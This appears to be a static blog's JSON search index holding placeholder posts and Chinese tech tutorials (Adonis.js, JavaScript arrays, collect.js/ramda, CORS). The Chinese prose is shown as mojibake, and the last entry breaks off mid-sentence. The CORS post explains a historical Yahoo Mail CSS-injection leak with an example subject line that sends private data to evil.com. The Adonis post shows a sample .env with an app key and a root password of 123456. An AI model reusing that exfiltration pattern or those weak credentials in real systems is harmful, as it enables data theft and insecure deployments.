[{"content":"Markdown here\n","description":"test post","id":0,"section":"updates","tags":null,"title":"May 2019","uri":"https://codthing.github.io/updates/2019_may/"},{"content":"Markdown here\n","description":"test post","id":1,"section":"docs","tags":null,"title":"Basic Usage","uri":"https://codthing.github.io/docs/gettingstarted/basicusage/"},{"content":"Markdown here\n","description":"test post","id":2,"section":"updates","tags":null,"title":"April 2019","uri":"https://codthing.github.io/updates/2019_april/"},{"content":"Markdown here\n","description":"test post","id":3,"section":"docs","tags":null,"title":"Configuration","uri":"https://codthing.github.io/docs/gettingstarted/configuration/"},{"content":"Markdown here\n","description":"test post","id":4,"section":"updates","tags":null,"title":"March 2019","uri":"https://codthing.github.io/updates/2019_march/"},{"content":"Markdown here\n","description":"test post","id":5,"section":"docs","tags":null,"title":"Installation","uri":"https://codthing.github.io/docs/gettingstarted/installation/"},{"content":"Markdown here\n","description":"test post","id":6,"section":"updates","tags":null,"title":"February 2019","uri":"https://codthing.github.io/updates/2019_february/"},{"content":"Markdown here\n","description":"test post","id":7,"section":"docs","tags":null,"title":"Quick Start","uri":"https://codthing.github.io/docs/gettingstarted/quickstart/"},{"content":"Markdown here\n","description":"test post","id":8,"section":"updates","tags":null,"title":"January 2019","uri":"https://codthing.github.io/updates/2019_january/"},{"content":"ä¸€ã€åˆå§‹åŒ– ç‰ˆæœ¬è¦æ±‚ï¼šNode.js v14\nåˆ›å»ºé¡¹ç›® yarn create adonis-ts-app hello-adonis 1 2 3 4 5 6  CUSTOMIZE PROJECT \u0026gt; Select the project structure Â· api \u0026gt; Enter the project name Â· hello-adonis \u0026gt; Setup eslint? (y/N) Â· true \u0026gt; Setup prettier? (y/N) Â» false   å¯åŠ¨å¼€å‘æœåŠ¡å™¨ node ace serve --watch ä¸ºç”Ÿäº§ç¼–è¯‘ node ace build --production\rcd build\rnode server.js \räºŒã€è·¯ç”± ç½‘ç«™æˆ– Web åº”ç”¨ç¨‹åºçš„ç”¨æˆ·å¯ä»¥è®¿é—®ä¸åŒçš„ URLï¼Œä¾‹å¦‚/,/aboutæˆ–/posts/1. è¦ä½¿è¿™äº› URL èµ·ä½œç”¨ï¼Œå¿…é¡»å°†å®ƒä»¬å®šä¹‰ä¸ºè·¯ç”±ã€‚\né»˜è®¤è·¯ç”±è·¯å¾„ï¼šstart/routes.ts\nåˆ—å‡ºè·¯ç”± node ace list:routes åµŒå¥—è·¯ç”±\u0026amp;è·¯ç”±åŸŸ 1 2 3 4 5 6 7 8  Route.group(() =\u0026gt; { Route.group(() =\u0026gt; { Route.get(\u0026#39;/users\u0026#39;, \u0026#39;UsersController.index\u0026#39;) // /api/v1/users  Route.get(\u0026#39;/posts\u0026#39;, \u0026#39;PostsController.index\u0026#39;) // /api/v1/posts  }).prefix(\u0026#39;/v1\u0026#39;) // è·¯ç”±å‰ç¼€ï¼ˆå¯é€‰ï¼‰ }).prefix(\u0026#39;/api\u0026#39;) // è·¯ç”±å‰ç¼€ï¼ˆå¯é€‰ï¼‰ .domain(\u0026#39;blog.adonisjs.com\u0026#39;) // è·¯ç”±åŸŸï¼ˆå¯é€‰ï¼‰   \rä¸‰ã€æ§åˆ¶å™¨ æ§åˆ¶å™¨æ˜¯å¤„ç†è·¯ç”±çš„å®é™…æ–¹å¼ã€‚é€šè¿‡å°†æ‰€æœ‰å†…è”è·¯ç”±å¤„ç†ç¨‹åºç§»åŠ¨åˆ°å…¶ä¸“ç”¨æ§åˆ¶å™¨æ–‡ä»¶æ¥å¤„ç†è·¯ç”±æ–‡ä»¶ã€‚\né»˜è®¤æ§åˆ¶å™¨è·¯å¾„ï¼šapp/Controllers/Http\n1. è‡ªåŠ¨ç”Ÿæˆæ§åˆ¶å™¨ç±» node ace make:controller Post 2. ç¼–è¾‘æ§åˆ¶å™¨ import { HttpContextContract } from \u0026#39;@ioc:Adonis/Core/HttpContext\u0026#39;\rexport default class PostsController {\rpublic async index(ctx: HttpContextContract) {\rreturn [\r{\rid: 1,\rtitle: \u0026#39;Hello world\u0026#39;,\r},\r{\rid: 2,\rtitle: \u0026#39;Hello universe\u0026#39;,\r},\r]\r}\r} 3. è·¯ç”±è°ƒç”¨æ§åˆ¶å™¨ import Route from \u0026#39;@ioc:Adonis/Core/Route\u0026#39;\rRoute.get(\u0026#39;/posts\u0026#39;, async (ctx) =\u0026gt; {\rconst { default: PostsController } = await import(\r\u0026#39;App/Controllers/Http/PostsController\u0026#39;\r)\rreturn new PostsController().index(ctx)\r}) \rå››ã€ä¸­é—´ä»¶ å°†ä¸­é—´ä»¶ç¼–å†™ä¸ºå†…è”å‡½æ•°å¯¹äºä¸€äº›å¿«é€Ÿæµ‹è¯•æ¥è¯´æ˜¯å¾ˆå¥½çš„ã€‚ä½†æ˜¯ï¼Œå»ºè®®å°†ä¸­é—´ä»¶é€»è¾‘æå–åˆ°å®ƒè‡ªå·±çš„æ–‡ä»¶ä¸­ã€‚\né»˜è®¤è·¯å¾„ï¼šapp/Middleware\n1. è‡ªåŠ¨ç”Ÿæˆä¸­é—´ä»¶ç±» node ace make:middleware Auth 2. ç¼–è¾‘ä¸­é—´ä»¶ import { HttpContextContract } from \u0026#39;@ioc:Adonis/Core/HttpContext\u0026#39;\rexport default class Auth {\rpublic async handle(\r{ request, response }: HttpContextContract,\rnext: () =\u0026gt; Promise\u0026lt;void\u0026gt;\r) {\rif (notAuthenticated) {\rresponse.unauthorized({ error: \u0026#39;Must be logged in\u0026#39; })\rreturn\r}\rawait next()\r}\r} 3. æ³¨å†Œä¸­é—´ä»¶ è¦ä½¿ä¸­é—´ä»¶ç”Ÿæ•ˆï¼Œå¿…é¡»åœ¨æ–‡ä»¶å†…æ³¨å†Œä¸ºå…¨å±€ä¸­é—´ä»¶æˆ–å‘½åä¸­é—´ä»¶ã€‚\nè·¯å¾„ï¼šstart/kernel.ts\nå…¨å±€ä¸­é—´ä»¶ å…¨å±€ä¸­é—´ä»¶æŒ‰ç…§ä¸æ³¨å†Œæ—¶ç›¸åŒçš„é¡ºåºä¸ºæ‰€æœ‰ HTTP è¯·æ±‚æ‰§è¡Œã€‚\nServer.middleware.register([\r() =\u0026gt; import(\u0026#39;@ioc:Adonis/Core/BodyParser\u0026#39;),\r() =\u0026gt; import(\u0026#39;App/Middleware/LogRequest\u0026#39;)\r]) å‘½åä¸­é—´ä»¶ æœ‰é€‰æ‹©åœ°åœ¨è·¯ç”±/è·¯ç”±ç»„ä¸Šåº”ç”¨ä¸­é—´ä»¶ã€‚\nServer.middleware.registerNamed({\rauth: () =\u0026gt; import(\u0026#39;App/Middleware/Auth\u0026#39;)\r}) 1 2 3 4  Route .get(\u0026#39;dashboard\u0026#39;, \u0026#39;DashboardController.index\u0026#39;) .middleware(\u0026#39;auth\u0026#39;) // ğŸ‘ˆ   \räº”ã€æ•°æ®åº“ Lucid Lucid ä¸ºæ¡†æ¶çš„æ•°æ®å±‚æä¾›æ”¯æŒã€‚\n1. å®‰è£… yarn add @adonisjs/lucid 2. è‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶ node ace configure @adonisjs/lucid 3. éªŒè¯é…ç½®ç¯å¢ƒå˜é‡ åœ¨ .env æ–‡ä»¶ä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // æ ¹æ®ä½¿ç”¨çš„æ•°æ®åº“é©±åŠ¨ç¨‹åºï¼Œå¿…é¡»éªŒè¯å®šä¹‰çš„ç¯å¢ƒå˜é‡ã€‚  // ä»¥ä¸‹æ˜¯ MySQL çš„ç¤ºä¾‹ã€‚ PORT=3333 HOST=0.0.0.0 NODE_ENV=development APP_KEY=yZNA8Mcjy4XRwijH8Uz924aSjt5M2x92 DRIVE_DISK=local DB_CONNECTION=mysql MYSQL_HOST=localhost MYSQL_PORT=3306 MYSQL_USER=root MYSQL_PASSWORD=123456 MYSQL_DB_NAME=world   æ‰€æœ‰æ•°æ®åº“é©±åŠ¨ç¨‹åºçš„é…ç½®éƒ½å­˜å‚¨åœ¨ config/database.ts æ–‡ä»¶ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  import Env from \u0026#39;@ioc:Adonis/Core/Env\u0026#39; import { DatabaseConfig } from \u0026#39;@ioc:Adonis/Lucid/Database\u0026#39; const databaseConfig: DatabaseConfig = { // Default connection  connection: Env.get(\u0026#39;DB_CONNECTION\u0026#39;), // List of available connections  connections: { mysql: { client: \u0026#39;mysql\u0026#39;, connection: { host: Env.get(\u0026#39;MYSQL_HOST\u0026#39;), port: Env.get(\u0026#39;MYSQL_PORT\u0026#39;), user: Env.get(\u0026#39;MYSQL_USER\u0026#39;), password: Env.get(\u0026#39;MYSQL_PASSWORD\u0026#39;), database: Env.get(\u0026#39;MYSQL_DB_NAME\u0026#39;), }, migrations: { naturalSort: true, }, healthCheck: false, debug: false, } } } export default databaseConfig   4. ä½¿ç”¨ åœ¨æ§åˆ¶å™¨ app/Controllers/Http/HelloWorldsController.ts ä¸­ä½¿ç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import Database from \u0026#39;@ioc:Adonis/Lucid/Database\u0026#39; import { HttpContextContract } from \u0026#39;@ioc:Adonis/Core/HttpContext\u0026#39; export default class HelloWorldsController { public async index(ctx: HttpContextContract) { // return { hello: \u0026#39;world\u0026#39; }  const limit = 20 const page = ctx.request.input(\u0026#39;page\u0026#39;, 1) return Database .from(\u0026#39;city\u0026#39;) // æ•°æ®è¡¨ city  .select(\u0026#39;*\u0026#39;) .orderBy(\u0026#39;id\u0026#39;, \u0026#39;desc\u0026#39;) .paginate(page, limit) } }   ","description":"","id":9,"section":"nodejs","tags":null,"title":"Adonis.js","uri":"https://codthing.github.io/nodejs/adonis/adonis/"},{"content":"ä¸€ã€å››ä¸ªå¿…å¤‡çš„jsæ•°ç»„æ–¹æ³• 1. Array.prototype.map() æ•°ç»„å…ƒç´ æ›´æ–°  åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ã€‚ç»“æœæ˜¯ä¸€ä¸ªä¸åŸæ•°ç»„é•¿åº¦ç›¸åŒçš„æ•°ç»„ï¼Œå¹¶æ ¹æ®æä¾›çš„å‡½æ•°è½¬æ¢å…ƒç´ ã€‚  1 2 3 4  const arr = [1, 2, 3]; const double = x =\u0026gt; x * 2; arr.map(double); // [2, 4, 6]   2. Array.prototype.filter() æ•°ç»„å…ƒç´ è¿‡æ»¤  åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ã€‚æ ¹æ®æä¾›çš„å‡½æ•°è¿”å›åŸæ•°ç»„çš„å­é›†ï¼Œç»“æœæ˜¯ä¸€ä¸ªä¸åŸæ•°ç»„é•¿åº¦ç›¸åŒæˆ–å°äºçš„æ•°ç»„ã€‚  1 2 3 4  const arr = [1, 2, 3]; const isOdd = x =\u0026gt; x % 2 === 1; arr.filter(isOdd); // [1, 3]   3. Array.prototype.reduce() æ•°ç»„è½¬æ¢  æ ¹æ®reducerå‡½æ•°å’Œåˆå§‹å€¼åˆ›å»ºä»»ä½•ç±»å‹çš„è¾“å‡ºå€¼ã€‚  1 2 3 4 5 6 7 8  const arr = [1, 2, 3]; const sum = (x, y) =\u0026gt; x + y; arr.reduce(sum, 0); // 6  const increment = (x, y) =\u0026gt; [...x, x[x.length - 1] + y]; arr.reduce(increment, [0]); // [0, 1, 3, 6]   4. Array.prototype.find() åŒ¹é…ç¬¬ä¸€ä¸ªå…ƒç´  1 2 3 4  const arr = [1, 2, 3]; const isOdd = x =\u0026gt; x % 2 === 1; arr.find(isOdd); // 1   äºŒã€åœ¨æ•°ç»„å¼€å¤´æ·»åŠ æ–°å…ƒç´  1. Array.prototype.concat 1 2 3 4 5  const array = [1, 2, 3]; const newFirstElement = 4; const newArray = [newFirstElement].concat(array); console.log(newArray); // [4, 1, 2, 3]   2. Array.prototype.unshift 1 2 3 4  const array = [1, 2, 3]; array.unshift(4); console.log(array); // [4, 1, 2, 3]   3. Spread å±•å¼€è¿ç®—ç¬¦ 1 2 3 4  const array = [1, 2, 3]; const newArray = [4, ...array]; console.log(newArray); // [4, 1, 2, 3]   4. Array.prototype.splice  splice(ç´¢å¼•, ä»ç¬¬ä¸€ä¸ªå‚æ•°ä¸­æŒ‡å®šçš„ç´¢å¼•å¼€å§‹åˆ é™¤çš„å…ƒç´ æ•°, æƒ³è¦æ’å…¥çš„å…ƒç´ )  1 2 3 4  const array = [1, 2, 3]; array.splice(0,0,4); console.log(array); // // [4, 1, 2, 3]   ä¸‰ã€ç§»é™¤æ•°ç»„é‡å¤é¡¹ 1. Set 1 2 3  const arr = [1, 1, 2, 3]; [...new Set(arr)]; // [1, 2, 3]   2. Array.prototype.filter 1 2 3  const arr = [1, 1, 2, 3]; arr.filter((item, index) =\u0026gt; arr.indexOf(item) === index); // [1,2,3]   3. Array.prototype.map 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = [] array.map((x) =\u0026gt; { if(!newArr.includes(x)) { newArr.push(x) }; }); return newArr; }; toUniqueArray(arr); // [1, 2, 3]   4. Array.prototype.forEach 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = {}; array.forEach(function(i) { if(!newArr[i]) { newArr[i] = true; } }); return Object.keys(newArr); } toUniqueArray(arr); // [\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;]   5. for 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = []; for (let i = 0; i \u0026lt; array.length; i++) { if (newArr.indexOf(array[i]) === -1) { newArr.push(array[i]); } } return newArr; }; toUniqueArray(arr); // [1, 2, 3]   å››ã€æ•°ç»„ä¸­æœ€å°å€¼å’Œæœ€å¤§å€¼  Math.min() Math.max() (\u0026hellip;) Spread å±•å¼€è¿ç®—ç¬¦  1 2 3 4  const arr = [2, 4, 6, 8, 1, 3, 5, 7]; Math.min(...arr); // 1 Math.max(...arr); // 8   ","description":"æœ‰è¶£çš„æ•°ç»„æ–¹æ³•å®ç°","id":10,"section":"javascript","tags":null,"title":"Array","uri":"https://codthing.github.io/javascript/array/array-bp/"},{"content":"collect.js \u0026amp; ramdaï¼ˆ å¤„ç†æ•°ç»„å’Œå¯¹è±¡çš„å¥½å¸®æ‰‹ ï¼‰\nStep1. å®‰è£… yarn add collect.js yarn add ramda Step2. å¯¼å…¥ import collect from \u0026#39;collect.js\u0026#39; import * as R from \u0026#39;ramda\u0026#39; Step3. ï¼ˆé¡¹ç›®å®ä¾‹ï¼Œç”¨æ¥æ¸²æŸ“å¤šå±ï¼Œæ¯å±é‡Œé¢æœ‰ 8 å¼ å¡ç‰‡ï¼‰ ä½¿ç”¨ collect.js ç¤ºä¾‹ ï¼Œä½¿ç”¨ chunk æ–¹æ³•\n//æ‹†åˆ†æ•°ç»„\rconst collection = collect(scenesData.data);\rconst chunks = collection.chunk(8);//æŒ‰8ä¸ªä¸ºä¸€ç»„æ‹†åˆ†\rconst newArr = chunks.all();\r//ç”¨äºæ¸²æŸ“çš„äºŒç»´æ•°ç»„åˆ—è¡¨(æ¯å±æœ€å¤š8ä¸ª)\rconst renderItems = newArr.map((items, key) =\u0026gt; {\rreturn (\r\u0026lt;ImageBackground key={key} source={require(\u0026#39;../../assets/images/bg.png\u0026#39;)} style={styles.slide}\u0026gt;\r{\ritems.map((item) =\u0026gt; {\rreturn (\r\u0026lt;Card key={item.scenId} onPress={() =\u0026gt; navigate(\u0026#39;Detail\u0026#39;, { data: item })} style={styles.card}\u0026gt;\r\u0026lt;Image source={{ uri: item.imgUrl }} style={styles.img} /\u0026gt;\r\u0026lt;Text style={styles.title}\u0026gt;\r{item.name}\r\u0026lt;/Text\u0026gt;\r\u0026lt;/Card\u0026gt;\r)\r})\r}\r\u0026lt;/ImageBackground\u0026gt;\r)\r}) ä½¿ç”¨ramdaç¤ºä¾‹ï¼Œä½¿ç”¨splitEveryæ–¹æ³•\n//æ‹†åˆ†æ•°ç»„\rconst newArr = R.splitEvery(8,scenesData.data) //æŒ‰8ä¸ªä¸ºä¸€ç»„æ‹†åˆ†\r//ç”¨äºæ¸²æŸ“çš„äºŒç»´æ•°ç»„åˆ—è¡¨(æ¯å±æœ€å¤š8ä¸ª)\rconst renderItems = newArr.map((items, key) =\u0026gt; {\rreturn (\r\u0026lt;ImageBackground key={key} source={require(\u0026#39;../../assets/images/bg.png\u0026#39;)} style={styles.slide}\u0026gt;\r{\ritems.map((item) =\u0026gt; {\rreturn (\r\u0026lt;Card key={item.scenId} onPress={() =\u0026gt; navigate(\u0026#39;Detail\u0026#39;, { data: item })} style={styles.card}\u0026gt;\r\u0026lt;Image source={{ uri: item.imgUrl }} style={styles.img} /\u0026gt;\r\u0026lt;Text style={styles.title}\u0026gt;\r{item.name}\r\u0026lt;/Text\u0026gt;\r\u0026lt;/Card\u0026gt;\r)\r})\r}\r\u0026lt;/ImageBackground\u0026gt;\r)\r}) å›¾ç¤º ","description":"æ•°ç»„å’Œå¯¹è±¡çš„å¥½å¸®æ‰‹","id":11,"section":"javascript","tags":null,"title":"Collect \u0026 Ramda","uri":"https://codthing.github.io/javascript/cr/cr/"},{"content":"CORS (è·¨åŸŸèµ„æºå…±äº«)ï¼Œå®ƒæ˜¯æµè§ˆå™¨è·å–å†…å®¹çš„æ–¹å¼çš„ä¸€éƒ¨åˆ†ã€‚\nä¸€ã€æ²¡æœ‰ CORS çš„è·¨åŸŸè®¿é—®å­˜åœ¨ä¸å®‰å…¨é—®é¢˜ è¿™ä¸æ˜¯æˆ‘ä»¬çš„é”™ï¼Œåªèƒ½è¯´è¿™æ˜¯WEBæŠ€æœ¯å‘å±•çš„å†å²é—®é¢˜\n\u0026lt;script src=\u0026#34;â€¦\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;â€¦\u0026#34; /\u0026gt;\r\u0026lt;iframe src=\u0026#34;â€¦\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\r\u0026lt;video src=\u0026#34;â€¦\u0026#34;\u0026gt;\u0026lt;/video\u0026gt;\r\u0026lt;audio src=\u0026#34;â€¦\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; åƒè¿™æ ·çš„ API è¿è¡Œæ—¶å‘å¦ä¸€ä¸ªç½‘ç«™å‘å‡ºè¯·æ±‚å¹¶ä»¥ç‰¹å®šçš„æ–¹å¼å¤„ç†å“åº”ï¼Œè€Œæ— éœ€å…¶ä»–ç«™ç‚¹çš„åŒæ„ã€‚\nå½“ä½ ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ä¹‹ä¸€è¯·æ±‚å…¶ä»–ç«™ç‚¹çš„å†…å®¹æ—¶ï¼Œå®ƒä¼šå‘é€å…¶ä»–ç«™ç‚¹çš„å‡­æ®ï¼ˆåŒ…æ‹¬ cookieã€TLSã€Authorizationç­‰ï¼‰ã€‚\nå¤šå¹´æ¥ï¼Œè¿™é€ æˆäº†å¤§é‡çš„å®‰å…¨é—®é¢˜ã€‚\n\u0026lt;img src=\u0026#34;https://your-bank/your-profile/you.jpg\u0026#34; /\u0026gt; å¦‚æœä¸Šé¢çš„å›¾ç‰‡åŠ è½½ï¼Œæˆ‘å¯ä»¥è¯»å–å›¾åƒçš„å®½åº¦å’Œé«˜åº¦ï¼Œç”šè‡³æ›´å¤šä¿¡æ¯ã€‚\n2009 å¹´ï¼Œäº‹å®è¯æ˜é›…è™é‚®ä»¶å®¹æ˜“å—åˆ°ä¸€ä¸ªç›¸å½“ç®€å•çš„æ”»å‡»ã€‚æ”»å‡»è€…å‘ç”¨æˆ·å‘é€ä¸€å°ç”µå­é‚®ä»¶ï¼Œä¸»é¢˜åŒ…æ‹¬');}ï¼Œç„¶åå¦ä¸€å°ç”µå­é‚®ä»¶çš„ä¸»é¢˜åŒ…æ‹¬{}html{background:url('//evil.com/?ï¼š\nâ€¦\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;Hey {}html{background:url(\u0026#39;//evil.com/?\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;â€¦private dataâ€¦\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;â€¦private dataâ€¦\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;â€¦private dataâ€¦\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026#34;email-subject\u0026#34;\u0026gt;Yo \u0026#39;);}\u0026lt;/li\u0026gt;\râ€¦ è¿™æ„å‘³ç€ç”¨æˆ·çš„ä¸€äº›ç§äººç”µå­é‚®ä»¶æ•°æ®è¢«å¤¹åœ¨ä¸€äº›å°†è§£æä¸ºæœ‰æ•ˆ CSS ä¸­ã€‚ç„¶åï¼Œæ”»å‡»è€…è¯´æœç”¨æˆ·è®¿é—®åŒ…å«ä»¥ä¸‹å†…å®¹çš„é¡µé¢ï¼š\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://m.yahoo.com/mail\u0026#34; /\u0026gt; \u0026hellip;ä½¿ç”¨yahoo.comçš„ cookieåŠ è½½ï¼ŒCSS è§£æå¹¶å°†ç§äººä¿¡æ¯å‘é€åˆ°evil.com.\nè¿™åªæ˜¯å†°å±±ä¸€è§’ï¼Œä»æµè§ˆå™¨é”™è¯¯åˆ°CPU æ¼æ´åˆ©ç”¨ï¼Œè¿™äº›æ³„æ¼çš„èµ„æºç»™æˆ‘ä»¬å¸¦æ¥äº†æ•°åå¹´çš„é—®é¢˜ã€‚\näºŒã€å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼ˆ1ï¼‰ å¾ˆæ˜æ˜¾ï¼Œä¸Šè¿°å†…å®¹æ˜¯ Web è®¾è®¡ä¸­çš„ä¸€ä¸ªé”™è¯¯ï¼Œå› æ­¤æˆ‘ä»¬ä¸å†åˆ›å»ºå¯ä»¥å¤„ç†æ­¤ç±»è¯·æ±‚çš„ APIã€‚ä»¥ä¸‹æ˜¯ä¸»è¦çš„ç­–ç•¥ï¼ˆè¿™é‡Œåªåˆ—å‡ºä¸»è¦çš„ï¼‰ï¼š\n1. åŒæºç­–ç•¥ çš„ç”±æ¥ 1995 å¹´ï¼ŒNetscape 2 å°±å¸¦æ¥äº†ä¸¤ä¸ªæƒŠäººçš„æ–°åŠŸèƒ½ï¼šLiveScript å’Œ HTML æ¡†æ¶ã€‚æ¡†æ¶è®©æ‚¨å¯ä»¥å°†ä¸€ä¸ªé¡µé¢åµŒå…¥åˆ°å¦ä¸€ä¸ªé¡µé¢ä¸­ï¼ŒLiveScript å¯ä»¥ä¸ä¸¤ä¸ªé¡µé¢è¿›è¡Œäº¤äº’ã€‚\nNetscape æ„è¯†åˆ°è¿™ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ï¼›ä½ ä¸å¸Œæœ›ä¸€ä¸ªé‚ªæ¶çš„é¡µé¢èƒ½å¤Ÿè¯»å–ä½ çš„é“¶è¡Œé¡µé¢çš„ DOMï¼Œæ‰€ä»¥ä»–ä»¬å†³å®šåªæœ‰åœ¨ä¸¤ä¸ªé¡µé¢å…·æœ‰ç›¸åŒçš„æ¥æºæ—¶æ‰å…è®¸è·¨æ¡†æ¶è„šæœ¬ã€‚\nè¿™å°±æ˜¯åŒæºç­–ç•¥çš„ç”±æ¥ã€‚\n#. åŒæºç­–ç•¥çš„ç¼ºé™· è¿™ä¸ªæƒ³æ³•æ˜¯åŒä¸€æ¥æºçš„ç½‘ç«™æ›´æœ‰å¯èƒ½æ‹¥æœ‰ç›¸åŒçš„æ‰€æœ‰è€…ã€‚\nè¿™å¹¶ä¸å®Œå…¨æ­£ç¡®ï¼Œå› ä¸ºå¾ˆå¤šç½‘ç«™éƒ½æŒ‰ URL åˆ’åˆ†å†…å®¹ï¼Œä¾‹å¦‚http://example.com/~danacoding/ï¼Œä½†å¿…é¡»åœ¨æŸå¤„åˆ’æ¸…ç•Œçº¿ã€‚\n2. æ¥æºä¸ç«™ç‚¹ ä¸€äº›ç½‘ç»œåŠŸèƒ½ä¸å¤„ç†æ¥æºï¼Œå®ƒä»¬å¤„ç†ç«™ç‚¹ã€‚\nä¾‹å¦‚ï¼Œhttps://help.youtube.comå’Œhttps://support.youtube.comæœ‰ä¸åŒçš„æ¥æºï¼Œä½†å®ƒä»¬æ˜¯ç›¸åŒçš„ç½‘ç«™ã€‚\nCookie æ˜¯åœ¨ç«™ç‚¹çº§åˆ«è¿è¡Œçš„æœ€å¸¸è§åŠŸèƒ½ï¼Œå› ä¸ºä½ å¯ä»¥åˆ›å»º Cookie å‘é€åˆ° youtube.com.\n#. ç«™ç‚¹çš„ç¼ºé™· ä½†æ˜¯ï¼ï¼ï¼è¿™æ˜¯ä¸€ä¸ªçœ‹èµ·æ¥ä¸€æ ·çš„ç«™ç‚¹ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªä¼ªç½‘ç«™ã€å­åŸŸæˆ–è€…å—åˆ°ä¸åŒå‰åç¼€çš„å½±å“ã€‚\nä¸‰ã€å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼ˆ2ï¼‰ 1. åˆ é™¤å‡­æ®ï¼Ÿ æŸäº›ç½‘ç«™æ ¹æ®è®¿é—®å®ƒä»¬çš„ IP åœ°å€æä¾›ä¸åŒçš„å†…å®¹ã€‚\nå› æ­¤ï¼Œå¦‚æœä½ åœ¨å®¶ä¸­è®¿é—®æˆ‘çš„ç½‘ç«™ï¼Œæˆ‘å¯ä»¥å¼€å§‹å‘å¸¸è§ä¸»æœºåå’Œ IP åœ°å€å‘å‡ºè¯·æ±‚ï¼Œå¯»æ‰¾ä¸å®‰å…¨çš„ç‰©è”ç½‘è®¾å¤‡ï¼Œå¯»æ‰¾ä½¿ç”¨é»˜è®¤å¯†ç çš„è·¯ç”±å™¨ã€‚\n#. åˆ é™¤å‡­æ®çš„ç¼ºé™· åˆ é™¤å‡­æ®æ˜¯è§£å†³æ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ï¼Œä½†ä»…é å®ƒæ˜¯ä¸å¤Ÿçš„ã€‚æ²¡æœ‰åŠæ³•çŸ¥é“èµ„æºæ˜¯å¦åŒ…åº”è¯¥å«ç§æœ‰æ•°æ®ã€‚\n2. ç»™èµ„æºæ·»åŠ å¤šä¸ªè·¨åŸŸæ¥æºï¼Ÿ // /crossdomain.xml\r\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\r\u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026#34;https://www.adobe.com/xml/dtds/cross-domain-policy.dtd\u0026#34;\u0026gt;\r\u0026lt;cross-domain-policy\u0026gt;\r\u0026lt;site-control permitted-cross-domain-policies=\u0026#34;master-only\u0026#34; /\u0026gt;\r\u0026lt;allow-access-from domain=\u0026#34;*.example.com\u0026#34; /\u0026gt;\r\u0026lt;allow-access-from domain=\u0026#34;www.example.com\u0026#34; /\u0026gt;\r\u0026lt;allow-http-request-headers-from domain=\u0026#34;*.adobe.com\u0026#34; headers=\u0026#34;SOAPAction\u0026#34; /\u0026gt;\r\u0026lt;/cross-domain-policy\u0026gt; è¿™æ˜¯ Flash æ‰€é‡‡ç”¨çš„å®‰å…¨æ¨¡å‹ï¼Œæˆ‘å¾ˆé™Œç”Ÿï¼Œæˆ‘å¯¹å®ƒä¸æ„Ÿå…´è¶£ï¼Œåæ­£å®ƒå­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œå¾ˆæ˜æ˜¾\n#. ç»™èµ„æºæ·»åŠ å¤šä¸ªè·¨åŸŸæ¥æºçš„ç¼ºé™· /crossdomain.xml æ¥æºä¼šå¼€å§‹å˜å¾—éå¸¸å¤šï¼Œè¯·æ±‚ä¹Ÿä¼šéå¸¸å¤šï¼Œè¶Šå¤šé—®é¢˜å°±è¶Šå¤§ã€‚\n3. ç»™ä¸åŒç±»å‹çš„èµ„æºæ·»åŠ è·¨åŸŸæ¥æºï¼Ÿ æ³¨æ„è¿™é‡Œçš„èµ„æºå’Œæ¥æºçš„åŒºåˆ«ã€‚\n#. ç»™ä¸åŒç±»å‹çš„èµ„æºæ·»åŠ è·¨åŸŸæ¥æºçš„ç¼ºé™· å¦‚æœï¼Œèµ„æºä¸æ˜¯xmlï¼Œå°±å¿…é¡»é€‰æ‹©ä¸åŒçš„æ ¼å¼ã€‚\n4. HTTP è¡¨å¤´æ·»åŠ è·¨åŸŸè¯·æ±‚ è¯­éŸ³æµè§ˆå™¨å·¥ä½œç»„çš„æè®®ä½¿ç”¨ HTTP æ ‡å¤´è¿›è¡Œäº†æ¦‚æ‹¬ï¼Œå¹¶æˆä¸ºè·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰ã€‚\nAccess-Control-Allow-Origin: * å››ã€CORS è¯·æ±‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°ç°ä»£ Web åŠŸèƒ½éƒ½éœ€è¦ CORSï¼Œä¾‹å¦‚fetch().\nç°ä»£åŠŸèƒ½ä¹Ÿæœ‰ä¾‹å¤–ï¼Œè¿™äº›åŠŸèƒ½æ—¨åœ¨æ”¯æŒä¸ä½¿ç”¨ CORS çš„æ—§åŠŸèƒ½ï¼Œä¾‹å¦‚\u0026lt;link 